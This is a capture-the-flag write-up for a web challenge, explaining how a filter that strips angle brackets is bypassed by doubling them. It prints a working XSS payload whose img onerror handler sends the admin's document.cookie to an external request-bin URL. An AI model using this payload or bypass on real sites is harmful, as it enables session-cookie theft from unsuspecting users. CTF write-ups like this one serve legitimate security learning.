# The Confused Deputy

This was a fairly easy web challenge with some very easy js injection. 

Looking at the source you can see that a request is made to `http://chall.csivit.com:30256/view` by the admin to view your colour. You can then specify a url and a colour for the admin to use.

I set up a request bin at `https://ennfyqj04serj.x.pipedream.net` so that I easily could monitor requests made to that url. But setting the url that the admin visits to anything outside of `http://chall.csivit.com:30256/view` seemed to throw an error. However I can set the colour to anything I like.

Looking at the source of `http://chall.csivit.com:30256/` it is clear that the only form of santitising is that "<" or ">" are replaced with "". This means that later on I could use ">>" in the place of ">" and "<<" in the place of "<".

The final exploit looked like the following
> }<</style>>`;<<img src=x onerror=document.location="https://ennfyqj04serj.x.pipedream.net/?c="+document.cookie;>>

Everything before and including the first semi-colon is used to escape the tags/quotes which the url is in.

The admin cookie is then sent to `https://ennfyqj04serj.x.pipedream.net/?c="+document.cookie` and the cookie is your flag.
